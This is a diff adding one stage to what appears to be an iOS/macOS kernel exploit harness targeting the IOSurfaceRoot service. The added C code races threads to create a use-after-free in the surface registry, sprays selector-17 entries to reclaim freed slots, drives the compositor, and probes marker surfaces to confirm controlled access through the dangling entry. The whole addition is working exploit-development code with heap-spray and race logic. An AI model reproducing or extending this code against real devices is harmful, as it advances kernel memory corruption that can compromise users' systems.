@@ -25275,6 +25275,210 @@ new_modes:
                 rlog("=== r=207 complete ===\n");
             }
 
+            /* r=208: Probe compositor surface access through UAF
+             *
+             * Single race attempt + verify which IOSurface the compositor
+             * accesses through the dangling registry entry.
+             *
+             * Strategy:
+             *   1. Create probe surfaces with unique marker patterns in shared memory
+             *   2. Race to create dangling registry entry
+             *   3. Spray probe surfaces to reclaim
+             *   4. Run compositor (triggers registry walk)
+             *   5. Check which probe surface's memory was modified by compositor
+             *   6. That surface = the one accessed through the dangling entry
+             *
+             * Usage: iosurface_sel17 208
+             */
+            if (rounds == 208) {
+                rlog("\n=== r=208: Probe compositor access through UAF ===\n");
+                io_service_t r208_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (!r208_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r208_done; }
+
+                #define R208_PROBE_COUNT 300
+                #define R208_MARKER 0xDEAD208BULL
+
+                CFMutableDictionaryRef r208_props = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int r208_w = 64, r208_h = 64, r208_bpe = 4, r208_pf = 0x42475241;
+                CFNumberRef r208_wn = CFNumberCreate(NULL, kCFNumberIntType, &r208_w);
+                CFNumberRef r208_hn = CFNumberCreate(NULL, kCFNumberIntType, &r208_h);
+                CFNumberRef r208_bn = CFNumberCreate(NULL, kCFNumberIntType, &r208_bpe);
+                CFNumberRef r208_pfn = CFNumberCreate(NULL, kCFNumberIntType, &r208_pf);
+                CFDictionarySetValue(r208_props, CFSTR("IOSurfaceWidth"), r208_wn);
+                CFDictionarySetValue(r208_props, CFSTR("IOSurfaceHeight"), r208_hn);
+                CFDictionarySetValue(r208_props, CFSTR("IOSurfaceBytesPerElement"), r208_bn);
+                CFDictionarySetValue(r208_props, CFSTR("IOSurfacePixelFormat"), r208_pfn);
+
+                int r208_hit = 0;
+
+                for (int attempt = 0; attempt < 3; attempt++) {
+                    rlog("\n  --- Attempt %d/3 ---\n", attempt + 1);
+
+                    /* Phase 1: Create probe surfaces and stamp each with a unique marker */
+                    IOSurfaceRef r208_probes[R208_PROBE_COUNT];
+                    IOSurfaceID r208_ids[R208_PROBE_COUNT];
+                    int r208_created = 0;
+                    for (int i = 0; i < R208_PROBE_COUNT; i++) {
+                        r208_probes[i] = IOSurfaceCreate(r208_props);
+                        if (!r208_probes[i]) continue;
+                        r208_ids[i] = IOSurfaceGetID(r208_probes[i]);
+                        r208_created++;
+
+                        IOSurfaceLock(r208_probes[i], 0, NULL);
+                        uint64_t *base = (uint64_t *)IOSurfaceGetBaseAddress(r208_probes[i]);
+                        if (base) {
+                            size_t alloc = IOSurfaceGetAllocSize(r208_probes[i]);
+                            size_t count = alloc / sizeof(uint64_t);
+                            for (size_t j = 0; j < count && j < 2048; j++)
+                                base[j] = R208_MARKER + i;
+                        }
+                        IOSurfaceUnlock(r208_probes[i], 0, NULL);
+
+                        char key[32];
+                        snprintf(key, sizeof(key), "probe_%d", i);
+                        CFStringRef ks = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
+                        int marker_val = 0xBEEF0000 + i;
+                        CFNumberRef mv = CFNumberCreate(NULL, kCFNumberIntType, &marker_val);
+                        IOSurfaceSetValue(r208_probes[i], ks, mv);
+                        CFRelease(ks);
+                        CFRelease(mv);
+                    }
+                    rlog("  Created %d probe surfaces (IDs %u..%u)\n",
+                         r208_created, r208_ids[0], r208_ids[r208_created - 1]);
+
+                    /* Phase 2: Multi-threaded race */
+                    io_connect_t r208_rc = IO_OBJECT_NULL;
+                    IOServiceOpen(r208_svc, mach_task_self(), 0, &r208_rc);
+                    if (!r208_rc) {
+                        rlog("  open failed\n");
+                        for (int i = 0; i < R208_PROBE_COUNT; i++)
+                            if (r208_probes[i]) CFRelease(r208_probes[i]);
+                        continue;
+                    }
+
+                    p11b_conn = r208_rc;
+                    p11b_go = 0;
+                    p11b_done = 0;
+                    pthread_t r208_ths[4];
+                    for (int t = 0; t < 4; t++)
+                        pthread_create(&r208_ths[t], NULL, p11b_worker, (void *)(uintptr_t)t);
+                    usleep(1000);
+                    p11b_go = 1;
+                    for (int t = 0; t < 4; t++)
+                        pthread_join(r208_ths[t], NULL);
+                    rlog("  Race done\n");
+
+                    /* Phase 3: Spray sel17 entries to reclaim freed registry slots */
+                    #define R208_SPRAY_CONNS 8
+                    io_connect_t r208_sconns[R208_SPRAY_CONNS];
+                    mach_port_t r208_swps[R208_SPRAY_CONNS * 64];
+                    int r208_sn = 0;
+                    for (int c = 0; c < R208_SPRAY_CONNS; c++) {
+                        r208_sconns[c] = IO_OBJECT_NULL;
+                        IOServiceOpen(r208_svc, mach_task_self(), 0, &r208_sconns[c]);
+                        if (!r208_sconns[c]) continue;
+                        for (int e = 0; e < 64; e++) {
+                            mach_port_t wp = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+                            mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t ref = 0x208000 + c * 64 + e;
+                            uint64_t inp[3] = {(uint64_t)(c * 64 + e + 1), 0, 0};
+                            IOConnectCallAsyncMethod(r208_sconns[c], 17, wp, &ref, 1,
+                                NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+                            r208_swps[r208_sn++] = wp;
+                        }
+                    }
+                    rlog("  Sprayed %d sel17 entries\n", r208_sn);
+
+                    /* Phase 4: Run compositor for 2 seconds */
+                    rlog("  Render (2s)...");
+                    p13_render_run = 1;
+                    p13_render_frames = 0;
+                    pthread_t r208_rt;
+                    pthread_create(&r208_rt, NULL, p13_render_loop, NULL);
+                    usleep(2000000);
+                    p13_render_run = 0;
+                    pthread_join(r208_rt, NULL);
+                    rlog(" frames=%d\n", p13_render_frames);
+
+                    /* Phase 5: Check which probe surfaces were modified */
+                    rlog("  Checking probe surfaces for compositor writes...\n");
+                    int r208_modified = 0;
+                    int r208_usecount_changed = 0;
+                    for (int i = 0; i < R208_PROBE_COUNT; i++) {
+                        if (!r208_probes[i]) continue;
+
+                        int32_t uc = IOSurfaceGetUseCount(r208_probes[i]);
+                        Boolean inuse = IOSurfaceIsInUse(r208_probes[i]);
+                        if (uc > 0 || inuse) {
+                            rlog("  ** Probe %d (ID %u): useCount=%d inUse=%d **\n",
+                                 i, r208_ids[i], uc, inuse);
+                            r208_usecount_changed++;
+                        }
+
+                        IOSurfaceLock(r208_probes[i], 1, NULL);
+                        uint64_t *base = (uint64_t *)IOSurfaceGetBaseAddress(r208_probes[i]);
+                        if (base) {
+                            uint64_t expected = R208_MARKER + i;
+                            int changed = 0;
+                            for (int j = 0; j < 64; j++) {
+                                if (base[j] != expected) { changed = 1; break; }
+                            }
+                            if (changed) {
+                                rlog("  ** Probe %d (ID %u): MEMORY MODIFIED! first8=0x%llx\n",
+                                     i, r208_ids[i], (unsigned long long)base[0]);
+                                r208_modified++;
+                                r208_hit = 1;
+                            }
+                        }
+                        IOSurfaceUnlock(r208_probes[i], 1, NULL);
+
+                        char key[32];
+                        snprintf(key, sizeof(key), "probe_%d", i);
+                        CFStringRef ks = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
+                        CFTypeRef val = IOSurfaceCopyValue(r208_probes[i], ks);
+                        if (!val) {
+                            rlog("  ** Probe %d (ID %u): PROPERTY MISSING!\n", i, r208_ids[i]);
+                            r208_hit = 1;
+                        }
+                        if (val) CFRelease(val);
+                        CFRelease(ks);
+                    }
+                    rlog("  Results: %d modified, %d useCount>0\n",
+                         r208_modified, r208_usecount_changed);
+
+                    /* Cleanup */
+                    IOServiceClose(r208_rc);
+                    for (int c = 0; c < R208_SPRAY_CONNS; c++)
+                        if (r208_sconns[c]) IOServiceClose(r208_sconns[c]);
+                    for (int i = 0; i < r208_sn; i++)
+                        mach_port_deallocate(mach_task_self(), r208_swps[i]);
+                    for (int i = 0; i < R208_PROBE_COUNT; i++)
+                        if (r208_probes[i]) CFRelease(r208_probes[i]);
+                    usleep(200000);
+
+                    if (r208_hit) {
+                        rlog("  *** COMPOSITOR ACCESSED PROBE SURFACE! ***\n");
+                        break;
+                    }
+                }
+
+                rlog("\n=== r=208 RESULTS ===\n");
+                if (r208_hit)
+                    rlog("  CONFIRMED: Compositor accesses controlled surface through UAF\n");
+                else
+                    rlog("  No compositor writes detected on probe surfaces\n");
+
+                CFRelease(r208_wn); CFRelease(r208_hn);
+                CFRelease(r208_bn); CFRelease(r208_pfn);
+                CFRelease(r208_props);
+                IOObjectRelease(r208_svc);
+                r208_done:
+                rlog("=== r=208 complete ===\n");
+            }
+
             IOServiceClose(conn17);
             IOObjectRelease(svc17);
         }
